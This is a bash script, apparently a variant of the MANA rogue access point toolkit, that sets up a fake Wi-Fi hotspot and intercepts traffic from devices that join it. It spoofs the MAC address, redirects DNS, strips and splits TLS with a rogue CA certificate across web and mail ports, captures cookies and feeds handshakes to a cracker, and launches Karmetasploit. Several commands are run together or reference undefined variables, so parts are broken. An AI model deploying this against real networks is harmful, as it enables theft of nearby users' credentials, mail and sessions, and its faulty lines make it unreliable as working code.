#!/bin/bash

upstream=$1
phy=$2
conf=/etc/hechizo/hostapd-karma.conf
eapconf=/etc/hechizo/hostapd-karma-eap.conf
hostapd=/usr/lib/hechizo/hostapd
crackapd=/usr/share/hechizo/crackapd/crackapd.py

usage() { echo "Usage: $0 [-s <45|90>] [-p <string>]" 1>&2; exit 1; }

while getopts ":s:p:" o; do
    case "${o}" in
        s)
            s=${OPTARG}
            ((s == 45 || s == 90)) || usage
            ;;
        p)
            p=${OPTARG}
            ;;
        *)
            usage
            ;;
    esac
done
shift $((OPTIND-1))

if [ -z "${s}" ] || [ -z "${p}" ]; then
    usage
fi

echo "s = ${s}"
echo "p = ${p}"

echo "Hit enter to exit."

function exitnclean 
{
	read
	echo "Ending services"
	
	pkill dhcpd
	pkill sslstrip
	pkill sslsplit
	pkill hostapd
	pkill python
	pkill dnsspoof
	pkill tinyproxy
	pkill stunnel4
	pkill ruby
	pkill msfconsole
	
	service apache2 stop
	
	echo "Reverting iptables"
	
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -t nat -F
	
	echo "Removing temp files"
	rm /tmp/crackapd.run
	rm $EXNODE
	
	exit
}

function sfn 
{
	service network-manager stop
	rfkill unblock wlan

	ifconfig $phy down
	macchanger -r $phy
	ifconfig $phy up

	sed -i "s/^interface=.*$/interface=$phy/" $conf
	$hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

	dhcpd -cf /etc/hechizo/dhcpd.conf $phy

	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -t nat -F
	iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
	iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
	iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
	#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1

	#SSLStrip with HSTS bypass
	cd /usr/share/hechizo/sslstrip-hsts/
	python sslstrip.py -l 10000 -a -w /var/lib/mana-	toolkit/sslstrip.log&
	iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
python dns2proxy.py $phy&
	cd -

	#SSLSplit
	sslsplit -D -P -Z -S /var/lib/hechizo/sslsplit -c /usr/share/hechizo/cert/rogue-ca.pem -k /usr/share/hechizo/cert/rogue-ca.key -O -l /var/lib/hechizo/sslsplit-connect.log https 0.0.0.0 10443 http 0.0.0.0 10080 ssl 0.0.0.0 10993 tcp 0.0.0.0 10143 ssl 0.0.0.0 10995 tcp 0.0.0.0 10110 ssl 0.0.0.0 10465 tcp 0.0.0.0 10025&
	#iptables -t nat -A INPUT -i $phy \
	#-p tcp --destination-port 80 \
	#-j REDIRECT --to-port 10080
	iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 443 -j REDIRECT --to-port 10443
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 143 -j REDIRECT --to-port 10143
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 993 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 465 -j REDIRECT --to-port 10465
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 25 -j REDIRECT --to-port 10025
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 995 -j REDIRECT --to-port 10995
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 110 -j REDIRECT --to-port 10110

	# Start FireLamb
	/usr/share/hechizo/firelamb/firelamb.py -i $phy &
	exitnclean
}

function sns
{
	service network-manager stop
	rfkill unblock wlan

	ifconfig $phy up

	sed -i "s/^interface=.*$/interface=$phy/" $conf $hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

	dhcpd -cf /etc/hechizo/dhcpd.conf $phy

	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -t nat -F
	iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
	iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
}
	
function snuse {

	# Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
	export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
	echo $EXNODE
	mkfifo $EXNODE
	$crackapd&

	service network-manager stop
	rfkill unblock wlan

	# Start hostapd
	sed -i "s/^interface=.*$/interface=$phy/" $conf
	sed -i "s/^bss=.*$/bss=$phy0/" $conf
	sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/hechizo/karmetasploit.rc
	$hostapd $conf&
	sleep 5
	ifconfig $phy
	ifconfig $phy0
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	ifconfig $phy0 10.1.0.1 netmask 255.255.255.0 route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1

	dhcpd -cf /etc/hechizo/dhcpd.conf $phy
	dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf /etc/hechizo/dhcpd-two.conf $phy0
	dnsspoof -i $phy -f /etc/hechizo/dnsspoof.conf&
	dnsspoof -i $phy0 -f /etc/hechizo/dnsspoof.conf&
	service apache2 start
	service stunnel4 start
	tinyproxy -c /etc/hechizo/tinyproxy.conf&
	msfconsole -r /etc/hechizo/karmetasploit.rc&

	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -t nat -F

	exitnclean	
}

function snus
{
	service network-manager stop
	rfkill unblock wlan

	ifconfig $phy down
	macchanger -r $phy
	ifconfig $phy up

	sed -i "s/^interface=.*$/interface=$phy/" $conf
	sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/hechizo/karmetasploit.rc
	$hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

	dhcpd -cf /etc/hechizo/dhcpd.conf $phy
	dnsspoof -i $phy -f /etc/hechizo/dnsspoof.conf&
	
	service apache2 start
	service stunnel4 start
	
	tinyproxy -c /etc/hechizo/tinyproxy.conf&
	msfconsole -r /etc/hechizo/karmetasploit.rc&

	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -t nat -F
	
	exitnclean
}
